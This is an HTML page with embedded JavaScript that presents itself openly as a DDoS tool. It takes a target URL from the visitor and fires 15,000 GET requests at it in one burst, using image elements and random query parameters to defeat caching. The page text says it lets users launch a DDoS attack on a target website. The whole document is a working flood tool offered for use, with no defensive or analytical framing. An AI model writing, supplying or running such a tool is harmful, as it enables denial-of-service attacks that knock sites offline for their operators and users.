<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DDoS Attack</title>
    <script>
        // Variable to track the status of the attack
        let attackInProgress = false;

        // Function to launch a DDoS attack
        async function launchDDoS() {
            // Check if an attack is already in progress
            if (attackInProgress) {
                console.log("Attack is already in progress.");
                return;
            }

            // Get the target URL from the user
            let targetURL = document.getElementById("targetURL").value;

            // Validate input
            if (!targetURL) {
                alert("Please enter a valid target URL.");
                return;
            }

            // Initialize a counter for completed requests
            let completedRequests = 0;

            // Set the status of the attack to in progress
            attackInProgress = true;

            // Launch the DDoS attack
            let interval = setInterval(function() {
                // Check if the attack has been stopped or completed
                if (!attackInProgress || completedRequests >= 15000) {
                    clearInterval(interval);
                    console.log("DDoS attack stopped.");
                    attackInProgress = false;
                    return;
                }

                // Send 15,000 requests
                for (let i = 0; i < 15000; i++) {
                    // Create an image element to make a GET request
                    let img = new Image();
                    
                    // Generate a random parameter to bypass caching
                    let randomParam = "param" + Math.floor(Math.random() * 1000000);
                    
                    // Set the image source to the target URL with a random parameter
                    img.src = targetURL + "?" + randomParam;

                    // Increment the counter for completed requests
                    completedRequests++;
                }
                
                // Log progress
                console.log("Sent 15,000 requests.");

            }, 2000); // Send 15,000 requests every 2 seconds
        }

        // Function to stop the DDoS attack
        function stopDDoS() {
            // Set the status of the attack to stopped
            attackInProgress = false;
        }
    </script>
</head>
<body>
    <h1>DDoS Attack</h1>
    <p>This page allows you to launch a DDoS attack on a target website.</p>
    <form>
        <label for="targetURL">Target URL:</label><br>
        <input type="text" id="targetURL" name="targetURL" placeholder="Enter the target URL"><br><br>
        
        <button type="button" onclick="launchDDoS()">Launch DDoS Attack</button>
        <button type="button" onclick="stopDDoS()">Stop DDoS Attack</button>
    </form>
</body>
</html>
